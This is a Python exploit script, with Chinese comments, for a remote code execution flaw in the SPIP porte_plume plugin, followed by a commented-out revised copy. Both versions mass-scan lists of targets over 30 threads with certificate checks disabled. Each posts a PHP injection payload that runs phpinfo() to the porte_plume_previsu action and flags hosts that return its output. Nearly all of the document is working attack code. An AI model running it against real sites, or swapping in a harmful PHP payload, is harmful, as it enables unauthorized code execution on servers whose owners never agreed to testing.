import requests, sys, argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parse = argparse.ArgumentParser(description="SPIP porte_plume插件 远程代码执行漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            target = f"http://{args.url}"
            check(target)
    elif args.file:
        f = open(args.file, 'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)
        pool.map(check, targets)
        pool.close()
def check(target):
    # target = f"{target}/index.php?action=porte_plume_previsu/"
    target = target.rstrip('/') + '/index.php?action=porte_plume_previsu'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',}
    data ={
        'data': 'AA_[<img111111>->URL`<?php phpinfo(); ?>`]_BB'
    }
    try:
        response = requests.post(target, headers=headers, data=data,verify=False, timeout=3)
        if response.status_code == 200 and 'phpinfo()' in response.text:
            print(f"[*] {target} 存在代码执行漏洞")
        else:
            print(f"[!] {target} 不存在代码执行漏洞")
    except Exception as e:
            print(f"[Error] {target} TimeOut")
if __name__ == '__main__':
    main()





#可以使用的代码
# import requests
# import sys
# import argparse
# from multiprocessing.dummy import Pool
#
# requests.packages.urllib3.disable_warnings()
#
#
# def normalize_url(url):
#     if not url.startswith("http://") and not url.startswith("https://"):
#         return "http://" + url
#     return url
#
#
# def main():
#     parse = argparse.ArgumentParser(description="SPIP porte_plume插件 远程代码执行漏洞")
#     parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
#     parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
#
#     args = parse.parse_args()
#     pool = Pool(30)
#
#     if args.url:
#         target = normalize_url(args.url)
#         check(target)
#     elif args.file:
#         f = open(args.file, 'r+')
#         targets = [normalize_url(target.strip()) for target in f.readlines()]
#         pool.map(check, targets)
#         pool.close()
#         pool.join()
#
#
# def check(target):
#     target = target.rstrip('/') + '/index.php?action=porte_plume_previsu'
#     headers = {
#         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
#     }
#     data = {
#         'data': 'AA_[<img111111>->URL`<?php phpinfo(); ?>`]_BB'
#     }
#
#     try:
#         response = requests.post(target, headers=headers, data=data, verify=False, timeout=5)
#         if response.status_code == 200 and 'Version' in response.text:
#             print(f"[*] {target} 存在代码执行漏洞")
#         else:
#             print(f"[!] {target} 不存在代码执行漏洞")
#     except requests.exceptions.Timeout:
#         print(f"[Error] {target} 请求超时")
#     except requests.exceptions.RequestException as e:
#         print(f"[Error] {target} 请求失败: {str(e)}")
#
#
# if __name__ == '__main__':
#     main()
